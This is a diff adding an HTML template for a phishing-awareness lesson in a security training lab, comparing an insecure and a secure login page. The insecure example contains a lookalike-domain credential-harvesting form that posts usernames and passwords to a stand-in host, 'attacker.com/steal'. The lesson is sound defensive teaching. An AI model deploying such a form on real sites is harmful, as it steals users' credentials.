@@ -1,0 +1,64 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<div class="content-container">
+    <a href="{{ url_for('lab') }}" class="btn btn-sm btn-outline-secondary mb-3"><i class="fa-solid fa-arrow-left me-1"></i> Back to Dashboard</a>
+    <nav aria-label="breadcrumb">
+        <ol class="breadcrumb">
+            <li class="breadcrumb-item"><a href="{{ url_for('lab') }}" class="text-decoration-none text-muted">Security Lab</a></li>
+            <li class="breadcrumb-item active" aria-current="page">Phishing Awareness</li>
+        </ol>
+    </nav>
+
+    <div class="border rounded p-4 mb-4 bg-white">
+        <h3 class="fs-4 fw-bold text-warning"><i class="fa-solid fa-fish me-2"></i>Module 7: Phishing Awareness</h3>
+        <p class="mt-3">Phishing is a social engineering attack where an attacker creates a fraudulent communication (like an email) that appears to come from a reputable source. It often links to a fake login page that is visually identical to the real website, tricking users into typing their credentials into the attacker's database.</p>
+        
+        <div class="row mt-4">
+            <div class="col-md-6">
+                <div class="border border-danger rounded h-100 p-3 bg-light">
+                    <span class="badge bg-danger mb-2"><i class="fa-solid fa-triangle-exclamation me-1"></i> Insecure (Vulnerable)</span>
+                    <p class="text-muted small">Falling for the visual disguise instead of verifying the source.</p>
+<pre class="bg-dark text-white p-3 rounded small"><code><span class="text-danger">&lt;!-- INSECURE EXAMPLE (for learning only) --&gt;</span>
+<span class="text-danger">&lt;!-- The Fake URL --&gt;</span>
+
+<span class="text-warning">URL: http://www.testing-app-support-login.com/login</span>
+
+&lt;form action="http://attacker.com/steal" method="POST"&gt;
+    &lt;h2&gt;Sign in to Testing App&lt;/h2&gt;
+    <span class="text-warning">&lt;!-- Looks exactly like our real login page --&gt;</span>
+    &lt;input type="text" name="username" placeholder="Username"&gt;
+    &lt;input type="password" name="password" placeholder="Password"&gt;
+    &lt;button type="submit"&gt;Sign In&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="border border-success rounded h-100 p-3 bg-light">
+                    <span class="badge bg-success mb-2"><i class="fa-solid fa-check me-1"></i> Secure (Mitigated)</span>
+                    <p class="text-muted small">Verifying the domain and using Multi-Factor Authentication.</p>
+<pre class="bg-dark text-white p-3 rounded small"><code><span class="text-success">&lt;!-- SECURE IMPLEMENTATION --&gt;</span>
+<span class="text-success">&lt;!-- The Real URL and MFA --&gt;</span>
+
+<span class="text-info">URL: https://www.testingapp.com/login (Always check the domain!)</span>
+
+&lt;form action="/login" method="POST"&gt;
+    &lt;h2&gt;Sign in to Testing App&lt;/h2&gt;
+    &lt;input type="text" name="username" placeholder="Username"&gt;
+    &lt;input type="password" name="password" placeholder="Password"&gt;
+    
+    <span class="text-info">&lt;!-- Even if an attacker steals the password via phishing, --&gt;</span>
+    <span class="text-info">&lt;!-- they cannot log in without the physical MFA token. --&gt;</span>
+    &lt;input type="text" name="mfa_code" placeholder="Authenticator Code"&gt;
+    
+    &lt;button type="submit"&gt;Sign In&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
